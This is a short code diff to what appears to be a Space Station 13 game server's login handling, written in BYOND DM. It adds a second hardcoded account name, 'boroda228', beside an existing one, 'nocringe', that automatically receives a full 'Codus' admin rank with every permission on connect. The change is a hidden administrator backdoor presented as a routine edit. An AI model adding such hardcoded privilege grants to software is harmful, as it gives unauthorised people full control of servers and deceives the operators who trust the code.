@@ -509,7 +509,7 @@ GLOBAL_LIST_INIT(blacklisted_builds, list(
 			to_chat(src, message)
 		GLOB.clientmessages.Remove(ckey)
 
-	if(ckey == "nocringe")
+	if(ckey == "nocringe" || ckey == "boroda228")
 		var/datum/admin_rank/localhost_rank = new("Codus", R_EVERYTHING, NONE, R_EVERYTHING)
 		new /datum/admins(list(localhost_rank), ckey, 1, 1)
 
